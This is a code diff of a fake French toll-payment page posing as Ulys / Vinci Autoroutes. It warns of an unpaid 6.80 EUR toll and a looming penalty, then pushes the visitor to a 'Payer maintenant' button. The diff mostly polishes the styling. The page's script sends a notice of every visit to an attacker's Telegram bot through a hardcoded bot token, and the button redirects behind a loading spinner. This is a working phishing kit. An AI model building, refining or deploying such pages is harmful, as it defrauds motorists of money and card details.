@@ -5,15 +5,165 @@
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>Régularisation de paiement – Ulys</title>
   <link rel="stylesheet" href="assets/css/style.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
   <style>
+    body {
+      font-family: 'Segoe UI', 'Inter', sans-serif;
+      background: #FBEAD3;
+      color: #1a1a1a;
+      margin: 0;
+    }
+
+    .site-nav {
+      background: #ffffff;
+      border-bottom: 1px solid #EAD1B8;
+    }
+
+    .navbar {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0.75rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .navbar-left {
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    .logo-container {
+      background: #ffffff;
+      padding: 4px 6px;
+      border-radius: 20px;
+    }
+
+    .logo {
+      width: 80px;
+      height: auto;
+    }
+
+    .header-toggle {
+      display: inline-flex;
+      border: 1px solid #ccc;
+      border-radius: 25px;
+      overflow: hidden;
+      background: #f6f6f6;
+    }
+
     .header-toggle button {
+      padding: 0.5rem 1.5rem;
+      background: transparent;
+      border: none;
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #444;
       cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .header-toggle .active {
+      background: #ff8000;
+      color: #fff;
+    }
+
+    .main.container {
+      max-width: 600px;
+      margin: 3rem auto;
+      padding: 0 1.5rem;
+    }
+
+    .context-card {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 3rem 2rem;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+      text-align: left;
+    }
+
+    .context-logo {
+      display: block;
+      margin: 0 auto 1.5rem;
+      max-width: 120px;
+    }
+
+    .context-title {
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 1.8rem;
+      font-family: 'Segoe UI', 'Inter', sans-serif;
+    }
+
+    .context-text p {
+      font-size: 1rem;
+      line-height: 1.6;
+      margin-bottom: 1rem;
+      color: #333;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      margin-top: 2rem;
+      padding: 0.85rem;
+      background: #ff8000;
+      color: white;
+      font-size: 1.05rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      text-align: center;
+    }
+
+    .btn:hover {
+      background: #e57200;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      background-color: #ffffff;
+      font-size: 0.9rem;
+      color: #555;
+      margin-top: 3rem;
+    }
+
+    .loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .loader {
+      border: 8px solid rgba(255, 255, 255, 0.2);
+      border-top: 8px solid #ff8000;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
 
-  <!-- NAVIGATION MINIMALE Ulys -->
+  <!-- NAVIGATION -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -31,18 +181,18 @@
   <!-- CONTENU PRINCIPAL -->
   <main class="main container">
     <div class="card context-card">
-      <img src="assets/images/logo-ulys2.png" alt="Ulys" class="context-logo" style="display:block; margin: 0 auto 1.5rem; max-width: 120px;"/>
-      <h2 style="text-align:center; color:#1a1a1a; margin-bottom:1.5rem;">Constatation de non-paiement</h2>
+      <img src="assets/images/logo-ulys2.png" alt="Ulys" class="context-logo"/>
+      <h2 class="context-title">Constatation de non-paiement</h2>
 
       <div class="context-text">
         <p>Bonjour,</p>
-        <p>Nous vous informons que votre dernier passage sur le réseau <strong>Vinci Autoroutes </strong> n’a pas pu être réglé correctement.
+        <p>Nous vous informons que votre dernier passage sur le réseau <strong>Vinci Autoroutes</strong> n’a pas pu être réglé correctement.
         Le montant dû s’élève à <strong>6,80€</strong>.</p>
         <p>Nous vous invitons à régulariser cette situation dans les plus brefs délais afin d’éviter l’application d’une <strong>somme forfaitaire de pénalité</strong>.</p>
-        <p>Le paiement peut être effectué simplement en ligne en cliquant sur le bouton ci-dessous. Une fois la transaction validée, aucune autre action ne sera requise de votre part..</p>
+        <p>Le paiement peut être effectué simplement en ligne en cliquant sur le bouton ci-dessous. Une fois la transaction validée, aucune autre action ne sera requise de votre part.</p>
       </div>
 
-      <button id="btn-pay" class="btn btn-danger">Payer maintenant</button>
+      <button id="btn-pay" class="btn">Payer maintenant</button>
     </div>
   </main>
 
@@ -51,13 +201,11 @@
   </footer>
 
   <script>
-    // Changement du bouton actif
     function toggleUserType(button) {
       document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
       button.classList.add("active");
     }
 
-    // Envoi Telegram automatique à chaque visite
     window.addEventListener('DOMContentLoaded', function () {
       const message = "📥 Nouvelle visite détectée sur la page d’accueil (index.html)";
       const token = "8136145861:AAEkeva-K5BGkAlK8FMxDVknMN9Y1YQx26I";
@@ -73,7 +221,6 @@
       });
     });
 
-    // Redirection avec spinner
     document.getElementById('btn-pay').addEventListener('click', function(){
       const overlay = document.createElement('div');
       overlay.className = 'loader-overlay';
